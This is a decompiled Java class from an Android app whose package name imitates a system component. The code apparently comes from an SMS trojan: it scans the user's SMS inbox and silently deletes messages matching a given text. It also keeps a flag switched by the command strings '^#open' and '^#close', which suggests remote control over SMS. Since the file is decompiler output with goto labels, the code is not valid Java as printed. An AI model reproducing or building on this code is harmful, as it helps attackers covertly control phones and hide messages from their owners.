// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.util.Log;

public class OpenSmsUtils
{

    private OpenSmsUtils()
    {
    }

    public static void deleteSMS(Context context, String s)
    {
        Cursor cursor;
        Uri uri = Uri.parse("content://sms/inbox");
        cursor = context.getContentResolver().query(uri, null, null, null, null);
_L1:
        if(!cursor.moveToNext())
            return;
        try
        {
            String s1 = cursor.getString(cursor.getColumnIndex("body")).trim();
            Log.i("wlc", (new StringBuilder("[3] detele body:")).append(s1).toString());
            if(s1.equals(s))
            {
                int i = cursor.getInt(cursor.getColumnIndex("_id"));
                context.getContentResolver().delete(Uri.parse("content://sms"), (new StringBuilder("_id=")).append(i).toString(), null);
            }
        }
        catch(Exception exception)
        {
            Log.i("wlc", (new StringBuilder("e:")).append(exception.getMessage()).toString());
            exception.printStackTrace();
            return;
        }
          goto _L1
    }

    public static OpenSmsUtils getInstance()
    {
        return instance;
    }

    public static boolean isOpenSms(Context context)
    {
        return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("open_sms_xxx", true);
    }

    public static void setOpenSms(Context context, boolean flag)
    {
        android.content.SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
        editor.putBoolean("open_sms_xxx", flag);
        editor.commit();
    }

    public static final String CLOSE_SMS = "^#close";
    public static final String OPEN_SMS = "^#open";
    private static OpenSmsUtils instance = new OpenSmsUtils();

}
